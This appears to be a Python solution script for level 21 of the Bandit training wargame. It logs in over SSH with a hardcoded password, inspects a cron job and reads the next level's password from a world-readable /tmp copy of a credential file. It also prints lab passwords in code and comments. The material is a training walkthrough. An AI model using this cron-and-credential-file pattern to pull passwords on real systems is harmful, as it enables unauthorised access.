import os
import sys
sys.path.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')

import utils
import paramiko

USERNAME = 'bandit21'
PASSWORD = 'gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print('connecting...\n')
client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)

# list out all configuration files in /etc/cron.d
# we found the following
# -rw-r--r-- 1 root root 120 May  7 20:14 cronjob_bandit22
print('ls -l /etc/cron.d')
_, stdout, _ = client.exec_command('ls -l /etc/cron.d')
utils.print_stdout(stdout)

# read the configuration file of cronjob_bandit22
# which leads us to the following file
# /usr/bin/cronjob_bandit22.sh
print('cat /etc/cron.d/cronjob_bandit22')
_, stdout, _ = client.exec_command('cat /etc/cron.d/cronjob_bandit22')
utils.print_stdout(stdout)

# read the sh file
print('cat /usr/bin/cronjob_bandit22.sh')
_, stdout, _ = client.exec_command('cat /usr/bin/cronjob_bandit22.sh')
utils.print_stdout(stdout)

# in the file, we found that it writes the password of bandit22 into a file in tmp directory
# cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
# additionally, it also allows anyone to read it
# chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
print('cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv')
_, stdout, _ = client.exec_command('cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv')
stdout = stdout.readlines()
utils.print_stdout(stdout)
password = utils.get_password(stdout)

# bandit22 password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
print(f'bandit22 password: {password}')

client.close()